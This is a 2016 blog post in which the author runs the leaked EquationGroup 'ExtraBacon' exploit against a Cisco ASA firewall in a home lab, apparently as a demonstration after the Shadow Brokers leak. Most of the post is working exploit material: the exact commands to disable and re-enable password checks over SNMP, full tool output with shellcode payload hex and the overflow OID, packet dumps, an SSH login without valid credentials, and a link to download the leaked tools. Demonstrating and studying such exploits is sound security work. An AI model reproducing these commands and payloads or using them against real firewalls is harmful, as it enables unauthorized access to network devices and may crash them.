---
author: XORcat
comments: true
date: 2016-08-16 11:10:15+00:00
layout: post
link: https://xorcat.net/2016/08/16/equationgroup-tool-leak-extrabacon-demo/
slug: equationgroup-tool-leak-extrabacon-demo
title: EquationGroup Tool Leak - ExtraBacon Demo
wordpress_id: 291
categories:
- InfoSec
tags:
- asa
- ASA Exploit
- cisco
- EquationGroup
- ExtraBacon
- InfoSec
- security
- ShadowBrokers
- tech
---

_Note: [In this subsequent post](https://xorcat.net/2016/08/19/equation-group-crashing-asas-follow-up/), I explore the DoS possibilities of this vulnerability (crash ASA, ASA requires manual power cycle to recover)_

Hi there,

You may have heard that recently (15/08/2016) a group known as Shadow Brokers released what are said to be a bunch of exploits and tools written and used by the NSA.

Two tar were released, one with the password of "theequationgroup", named "eqgrp-free-file.tar.xz.gpg". The other is named "eqgrp-auction-file.tar.xz.gpg", and according to the post where Shadow Brokers broke the news (now removed, but cached [here](https://webcache.googleusercontent.com/search?q=cache:owtq6OBSmgEJ:https://theshadowbrokers.tumblr.com/+&cd=1&hl=en&ct=clnk&gl=us)), they will release the key for this file, which supposedly contains juicier content, to the person who bids the most in their bitcoin auction, which ends at a time of Shadow Brokers' choosing.

<!-- more -->

The files are currently still available for download from [this MEGA link](https://mega.nz/#!zEAU1AQL!oWJ63n-D6lCuCQ4AY0Cv_405hX8kn7MEsa1iLH5UjKU), although I don't know how long it will stay alive, as it was also hosted on GitHub, who tore it down shortly after it being posted.

The exploits [appear to be targeting firewalls](https://medium.com/@msuiche/shadow-brokers-nsa-exploits-of-the-week-3f7e17bdc216#.jplzn0cwi), particularly Cisco PIX/ASA, Juniper Netscreen, Fortigate, and more.

Seeing that there is an exploit for the Cisco ASA, I thought I would give it a shot in my CCNA Security ASA lab!

The requirements for the ExtraBacon exploit are that you have SNMP read access to the firewall, as well as access to either telnet or SSH. The ASA must be running 8.x, up to 8.4(4), and is said to have the possibility to crash the firewall if something goes wrong.

Once the exploit is successful, the attacker will be able to SSH to or telnet to (depending on what protocol is setup on the FW) without needing to enter credentials. If an enable password is set, this will still need to be a barrier for managing the firewall, as the exploit does not appear to disable it.

The command to execute the authentication disabling payload is:

    
    python extrabacon_1.1.0.1.py exec -t 10.1.1.250 -c pubString --mode pass-disable


Which gives the following output:

    
    xorcat@boxen:~/Downloads/EQGRP-Auction-Files/Firewall/EXPLOITS/EXBA[130] $ python extrabacon_1.1.0.1.py exec -t 10.1.1.250 -c pubString --mode pass-disable
    WARNING: No route found for IPv6 destination :: (no default route?)
    Logging to /Users/xorcat/Downloads/EQGRP-Auction-Files/Firewall/EXPLOITS/EXBA/concernedparent
    [+] Executing:  extrabacon_1.1.0.1.py exec -t 10.1.1.250 -c pubString --mode pass-disable
    [+] probing target via snmp
    [+] Connecting to 10.1.1.250:161
    ****************************************
    [+] response:
    ###[ SNMP ]###
      version   = <ASN1_INTEGER[1L]>
      community = <ASN1_STRING['pubString']>
      PDU       
       |###[ SNMPresponse ]###
       |  id        = <ASN1_INTEGER[0L]>
       |  error     = <ASN1_INTEGER[0L]>
       |  error_index= <ASN1_INTEGER[0L]>
       |  varbindlist
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.1.0']>
       |   |  value     = <ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']>
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.3.0']>
       |   |  value     = <ASN1_TIME_TICKS[9300L]>
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.5.0']>
       |   |  value     = <ASN1_STRING['LAB-ASA']>
    
    [+] firewall uptime is 9300 time ticks, or 0:01:33
    
    [+] firewall name is LAB-ASA
    
    [+] target is running asa842, which is supported
    Data stored in key file  : asa842
    Data stored in self.vinfo: ASA842
    [+] generating exploit for exec mode pass-disable
    [+] using shellcode in ./versions
    [+] importing version-specific shellcode shellcode_asa842
    [+] building payload for mode pass-disable
    appended PMCHECK_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3
    appended AAAADMINAUTH_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3
    [+] random SNMP request-id 59358486
    [+] fixing offset to payload 53
    overflow (112): 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.67.123.122.173.53.165.165.165.165.131.236.4.137.4.36.137.229.131.197.72.49.192.49.219.179.16.49.246.191.174.170.170.170.129.247.165.165.165.165.96.139.132.36.224.1.0.0.4.53.255.208.97.195.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.25.71.20.9.139.124.36.20.139.7.255.224.144
    payload (133): bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c3
    EXBA msg (373): 308201710201010409707562537472696e67a582015f02040389bd160201000201013082014f30819106072b060102010101048185bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c33081b80681b32b060104010909836b010303010105095f8138437b7a812d3581258125812581258103816c048109042481098165810381454831814031815b813310318176813f812e812a812a812a81018177812581258125812560810b81042481600100000435817f8150618143811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811019471409810b7c2414810b07817f816081100500
    [+] Connecting to 10.1.1.250:161
    [+] packet 1 of 1
    [+] 0000   30 82 01 71 02 01 01 04  09 70 75 62 53 74 72 69   0..q.....pubStri
    [+] 0010   6E 67 A5 82 01 5F 02 04  03 89 BD 16 02 01 00 02   ng..._..........
    [+] 0020   01 01 30 82 01 4F 30 81  91 06 07 2B 06 01 02 01   ..0..O0....+....
    [+] 0030   01 01 04 81 85 BF A5 A5  A5 A5 B8 D8 A5 A5 A5 31   ...............1
    [+] 0040   F8 BB A5 25 F6 AC 31 FB  B9 A5 B5 A5 A5 31 F9 BA   ...%..1......1..
    [+] 0050   A2 A5 A5 A5 31 FA CD 80  EB 14 BF F0 8F 53 09 31   ....1........S.1
    [+] 0060   C9 B1 04 FC F3 A4 E9 0C  00 00 00 5E EB EC E8 F8   ...........^....
    [+] 0070   FF FF FF 31 C0 40 C3 BF  A5 A5 A5 A5 B8 D8 A5 A5   ...1.@..........
    [+] 0080   A5 31 F8 BB A5 B5 AD AD  31 FB B9 A5 B5 A5 A5 31   .1......1......1
    [+] 0090   F9 BA A2 A5 A5 A5 31 FA  CD 80 EB 14 BF E0 13 08   ......1.........
    [+] 00a0   08 31 C9 B1 04 FC F3 A4  E9 0C 00 00 00 5E EB EC   .1...........^..
    [+] 00b0   E8 F8 FF FF FF 31 C0 40  C3 C3 30 81 B8 06 81 B3   .....1.@..0.....
    [+] 00c0   2B 06 01 04 01 09 09 83  6B 01 03 03 01 01 05 09   +.......k.......
    [+] 00d0   5F 81 38 43 7B 7A 81 2D  35 81 25 81 25 81 25 81   _.8C{z.-5.%.%.%.
    [+] 00e0   25 81 03 81 6C 04 81 09  04 24 81 09 81 65 81 03   %...l....$...e..
    [+] 00f0   81 45 48 31 81 40 31 81  5B 81 33 10 31 81 76 81   .EH1.@1.[.3.1.v.
    [+] 0100   3F 81 2E 81 2A 81 2A 81  2A 81 01 81 77 81 25 81   ?...*.*.*...w.%.
    [+] 0110   25 81 25 81 25 60 81 0B  81 04 24 81 60 01 00 00   %.%.%`....$.`...
    [+] 0120   04 35 81 7F 81 50 61 81  43 81 10 81 10 81 10 81   .5...Pa.C.......
    [+] 0130   10 81 10 81 10 81 10 81  10 81 10 81 10 81 10 81   ................
    [+] 0140   10 81 10 81 10 81 10 81  10 81 10 81 10 81 10 81   ................
    [+] 0150   10 81 10 81 10 81 10 81  10 81 10 81 10 81 10 81   ................
    [+] 0160   10 19 47 14 09 81 0B 7C  24 14 81 0B 07 81 7F 81   ..G....|$.......
    [+] 0170   60 81 10 05 00                                     `....
    ****************************************
    [+] response:
    ###[ SNMP ]###
      version   = <ASN1_INTEGER[1L]>
      community = <ASN1_STRING['pubString']>
      PDU       
       |###[ SNMPresponse ]###
       |  id        = <ASN1_INTEGER[59358486L]>
       |  error     = <ASN1_INTEGER[0L]>
       |  error_index= <ASN1_INTEGER[0L]>
       |  varbindlist
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.1.0']>
       |   |  value     = <ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']>
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.4.1.99.12.36.1.1.1.116.114.97.112.104.111.115.116.46.112.117.98.83.116.114.105.110.103.46.49.48.46.49.46.49.46.51.46.50']>
       |   |  value     = <ASN1_STRING['']>
    [+] received SNMP id 59358486, matches random id sent, likely success
    [+] clean return detected


And if everything goes well (which it did for me!):

    
    xorcat@boxen:~/Downloads/EQGRP-Auction-Files/Firewall/EXPLOITS/EXBA$ ssh test@10.1.1.250
    test@10.1.1.250's password:
    Type help or '?' for a list of available commands.
    LAB-ASA> en
    Password: **********
    LAB-ASA# exit
    
    Logoff


You can get on the ASA without entering a valid username or password!

As noted above, the enable password still appears to be a requirement once this exploit has been run.

In order to re-enable the password checks, you run the following:

    
    python extrabacon_1.1.0.1.py exec -t 10.1.1.250 -c pubString --mode pass-enable


To get the following output:

    
    WARNING: No route found for IPv6 destination :: (no default route?)
    Logging to /Users/xorcat/Downloads/EQGRP-Auction-Files/Firewall/EXPLOITS/EXBA/concernedparent
    [+] Executing:  extrabacon_1.1.0.1.py exec -t 10.1.1.250 -c pubString --mode pass-enable
    [+] probing target via snmp
    [+] Connecting to 10.1.1.250:161
    ****************************************
    [+] response:
    ###[ SNMP ]###
      version   = <ASN1_INTEGER[1L]>
      community = <ASN1_STRING['pubString']>
      PDU       
       |###[ SNMPresponse ]###
       |  id        = <ASN1_INTEGER[0L]>
       |  error     = <ASN1_INTEGER[0L]>
       |  error_index= <ASN1_INTEGER[0L]>
       |  varbindlist
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.1.0']>
       |   |  value     = <ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']>
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.3.0']>
       |   |  value     = <ASN1_TIME_TICKS[73200L]>
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.5.0']>
       |   |  value     = <ASN1_STRING['LAB-ASA']>
    
    [+] firewall uptime is 73200 time ticks, or 0:12:12
    
    [+] firewall name is LAB-ASA
    
    [+] target is running asa842, which is supported
    Data stored in key file  : asa842
    Data stored in self.vinfo: ASA842
    [+] generating exploit for exec mode pass-enable
    [+] using shellcode in ./versions
    [+] importing version-specific shellcode shellcode_asa842
    [+] building payload for mode pass-enable
    appended PMCHECK_ENABLE payload eb14bff08f530931c9b104fcf3a4e92f0000005eebece8f8ffffff5531c089bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa0a5a5a531facd80
    appended AAAADMINAUTH_ENABLE payload eb14bfe013080831c9b104fcf3a4e92f0000005eebece8f8ffffff5589e557bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa0a5a5a531facd80
    [+] random SNMP request-id 356335863
    [+] fixing offset to payload 53
    overflow (112): 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.67.123.122.173.53.165.165.165.165.131.236.4.137.4.36.137.229.131.197.72.49.192.49.219.179.16.49.246.191.174.170.170.170.129.247.165.165.165.165.96.139.132.36.224.1.0.0.4.53.255.208.97.195.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.25.71.20.9.139.124.36.20.139.7.255.224.144
    payload (133): eb14bff08f530931c9b104fcf3a4e92f0000005eebece8f8ffffff5531c089bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa0a5a5a531facd80eb14bfe013080831c9b104fcf3a4e92f0000005eebece8f8ffffff5589e557bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa0a5a5a531facd80c3
    EXBA msg (373): 308201710201010409707562537472696e67a582015f0204153d40f70201000201013082014f30819106072b060102010101048185eb14bff08f530931c9b104fcf3a4e92f0000005eebece8f8ffffff5531c089bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa0a5a5a531facd80eb14bfe013080831c9b104fcf3a4e92f0000005eebece8f8ffffff5589e557bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa0a5a5a531facd80c33081b80681b32b060104010909836b010303010105095f8138437b7a812d3581258125812581258103816c048109042481098165810381454831814031815b813310318176813f812e812a812a812a81018177812581258125812560810b81042481600100000435817f8150618143811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811019471409810b7c2414810b07817f816081100500
    [+] Connecting to 10.1.1.250:161
    [+] packet 1 of 1
    [+] 0000   30 82 01 71 02 01 01 04  09 70 75 62 53 74 72 69   0..q.....pubStri
    [+] 0010   6E 67 A5 82 01 5F 02 04  15 3D 40 F7 02 01 00 02   ng..._...=@.....
    [+] 0020   01 01 30 82 01 4F 30 81  91 06 07 2B 06 01 02 01   ..0..O0....+....
    [+] 0030   01 01 04 81 85 EB 14 BF  F0 8F 53 09 31 C9 B1 04   ..........S.1...
    [+] 0040   FC F3 A4 E9 2F 00 00 00  5E EB EC E8 F8 FF FF FF   ..../...^.......
    [+] 0050   55 31 C0 89 BF A5 A5 A5  A5 B8 D8 A5 A5 A5 31 F8   U1............1.
    [+] 0060   BB A5 25 F6 AC 31 FB B9  A5 B5 A5 A5 31 F9 BA A0   ..%..1......1...
    [+] 0070   A5 A5 A5 31 FA CD 80 EB  14 BF E0 13 08 08 31 C9   ...1..........1.
    [+] 0080   B1 04 FC F3 A4 E9 2F 00  00 00 5E EB EC E8 F8 FF   ....../...^.....
    [+] 0090   FF FF 55 89 E5 57 BF A5  A5 A5 A5 B8 D8 A5 A5 A5   ..U..W..........
    [+] 00a0   31 F8 BB A5 B5 AD AD 31  FB B9 A5 B5 A5 A5 31 F9   1......1......1.
    [+] 00b0   BA A0 A5 A5 A5 31 FA CD  80 C3 30 81 B8 06 81 B3   .....1....0.....
    [+] 00c0   2B 06 01 04 01 09 09 83  6B 01 03 03 01 01 05 09   +.......k.......
    [+] 00d0   5F 81 38 43 7B 7A 81 2D  35 81 25 81 25 81 25 81   _.8C{z.-5.%.%.%.
    [+] 00e0   25 81 03 81 6C 04 81 09  04 24 81 09 81 65 81 03   %...l....$...e..
    [+] 00f0   81 45 48 31 81 40 31 81  5B 81 33 10 31 81 76 81   .EH1.@1.[.3.1.v.
    [+] 0100   3F 81 2E 81 2A 81 2A 81  2A 81 01 81 77 81 25 81   ?...*.*.*...w.%.
    [+] 0110   25 81 25 81 25 60 81 0B  81 04 24 81 60 01 00 00   %.%.%`....$.`...
    [+] 0120   04 35 81 7F 81 50 61 81  43 81 10 81 10 81 10 81   .5...Pa.C.......
    [+] 0130   10 81 10 81 10 81 10 81  10 81 10 81 10 81 10 81   ................
    [+] 0140   10 81 10 81 10 81 10 81  10 81 10 81 10 81 10 81   ................
    [+] 0150   10 81 10 81 10 81 10 81  10 81 10 81 10 81 10 81   ................
    [+] 0160   10 19 47 14 09 81 0B 7C  24 14 81 0B 07 81 7F 81   ..G....|$.......
    [+] 0170   60 81 10 05 00                                     `....
    ****************************************
    [+] response:
    ###[ SNMP ]###
      version   = <ASN1_INTEGER[1L]>
      community = <ASN1_STRING['pubString']>
      PDU       
       |###[ SNMPresponse ]###
       |  id        = <ASN1_INTEGER[356335863L]>
       |  error     = <ASN1_INTEGER[0L]>
       |  error_index= <ASN1_INTEGER[0L]>
       |  varbindlist
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.2.1.1.1.0']>
       |   |  value     = <ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']>
       |   |###[ SNMPvarbind ]###
       |   |  oid       = <ASN1_OID['.1.3.6.1.4.1.99.12.36.1.1.1.116.114.97.112.104.111.115.116.46.112.117.98.83.116.114.105.110.103.46.49.48.46.49.46.49.46.51.46.50']>
       |   |  value     = <ASN1_STRING['']>
    [+] received SNMP id 356335863, matches random id sent, likely success
    [+] clean return detected


Which re-enables password checking on the ASA, and which did not have any harmful impact on my lab ASA. Nothing crashed, traffic kept flowing, everything was happy.

[I've also uploaded a PCAP](https://www.sendspace.com/file/b7cfil) of the SNMP messages that ExtraBacon used in my lab to disable and re-enable password checking. The first 4 packets were seen when disabling checking, and the last 2 were seen when re-enabling checking.

There you go, NSA built firewall exploits that are easy to use!

Let me know if you have played with any of the other exploits that came out of Shadow Brokers, or have any questions, I'm (almost) always available on twitter [@XORcat](https://twitter.com/XORcat).
